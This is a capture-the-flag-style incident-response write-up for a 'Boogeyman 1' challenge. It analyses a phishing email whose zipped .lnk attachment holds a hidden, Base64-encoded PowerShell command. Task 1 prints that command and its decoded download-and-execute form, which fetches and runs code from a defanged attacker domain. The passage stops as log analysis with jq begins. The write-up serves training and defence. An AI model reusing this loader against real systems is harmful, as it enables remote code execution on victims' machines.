# Title: Challenge 3 Write-Up: Boogeyman 1

# Introduction

***Scenario Overview:***  🛡️ ﻿Uncover the secrets of the new emerging threat, the Boogeyman threat actor 

***Objective:***  🔎 Analyze the Tactics, Techniques, and Procedures (TTPs) executed by a threat group, from obtaining initial access until achieving its objective. 

**Environment and Tools Used:** 
- Linux
- jq
- Wireshark
- Tshark
- Thunderbird
- Lnkparser3 
- Linux command line tools such as awk, grep, sed, and base64

**Given Artifacts:**
- copy of a phishing email (dump.eml)
- Powershell Logs from Julianne's Workstation
- Packet Capture From the same workstation (Capture.pcap)

***Goals:***
- Gained familiarity in using Wireshark and TShark to determine if and to which extent is an particular endpoint compromised.  
- Extract TTPs using Wireshark, TShark, and Linux command line tools
- Demonstrate experience in using Wireshark and TShark.
- Demonstrate skill and experience in analyzing a phishing email by analyzing headers and body of the email in the original HTML.


# Start of the Investigation 


### Task 1: Email Analysis 

If we remember from the introduction, we are given an email file (dump.eml) that may include malicious attachments. We can analyze the email using Thunderbird. 
We extract the following information from dump.eml by looking at the headers, message body as original HTML: We make sure to pay close attention to the following sections: DKIM-Signatures, From, To, Received From, Return=Path and any attachments.
Some details gathered: 
- Email address used to send the phishing email: *agriffin@bpakcaging[.]xyz*
- Email Address of victim: *julianne.westcott@hotmail[.]*
- Third-Party mail relay service used: *elasticemail*

*Attachment Analysis*

The attachment included in the suspicious email was identified as Invoice.zip. The full email, including the message body and email headers, was uploaded to a message header analysis tool to provide additional context surrounding the email and its origin.

The attachment was extracted using Thunderbird, revealing an additional file named invoice_20230103.lnk. The email body contained a password required to decrypt/extract the contents of the attachment.

After extracting the .lnk file, LnkParse was used to analyze the shortcut and identify embedded command-line arguments:

**lnkparse Invoice_20230103.lnk**

Analysis of the LnkParse output revealed a suspicious command containing a Base64-encoded PowerShell payload. The presence of PowerShell execution with a hidden window and an encoded command is consistent with techniques commonly used to obfuscate malicious activity.

Observed command:

**nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==**

The encoded argument was decoded using CyberChef's Base64 decoder, followed by removal of the embedded null bytes. This produced the following PowerShell command:

**-nop -windowstyle hidden iex (new-object net.webclient).downloadstring('hxxp://files.bpakcaging[.]xyz/update')**

**Findings**

The decoded payload demonstrates several suspicious behaviors:
 - nop: Attempts to prevent PowerShell profiles from loading.
 - windowstyle hidden: Executes PowerShell with the window hidden from the user.
 - enc: Uses Base64 encoding to obfuscate the PowerShell command within the .lnk file.
 - iex: Invokes Invoke-Expression to execute the retrieved content.
 - Net.WebClient: Creates a web client used to retrieve content from a remote server.
 - DownloadString(): Downloads the contents of the specified URL directly into memory.
 - External URL: hxxp://files.bpakcaging[.]xyz/update

The combination of an email-delivered .lnk file, hidden PowerShell execution, Base64 obfuscation, and retrieval of a remote payload is highly suspicious and indicates that the shortcut was likely intended to serve as an initial execution mechanism for additional malicious code.

<img width="1566" height="163" alt="image" src="https://github.com/user-attachments/assets/c0ca83e7-b6f9-4a36-b9a2-8953572c25aa" />
<img width="1532" height="568" alt="image" src="https://github.com/user-attachments/assets/122198a6-5c5a-4d77-9bab-bd0a5d9fef88" />


### Task 2: Endpoint Security

We now can conclude that the PowerShell command observed in the first task signaled initial execution and compromise of this workstation. Further actions along the kill chain are most likely after initial access. 
Our supervisor has given us an helpful investigative guide to follow for task 2.
- Using the previous findings, we can start our analysis by searching the execution of the initial payload in the PowerShell logs.
- Since the given data is JSON, we can parse it in CLI using the jq command.
- Note that some logs are redundant and do not contain any critical information; hence can be ignored.

We will use jq to parse and analyze the PowerShell.json artifact that we are provided




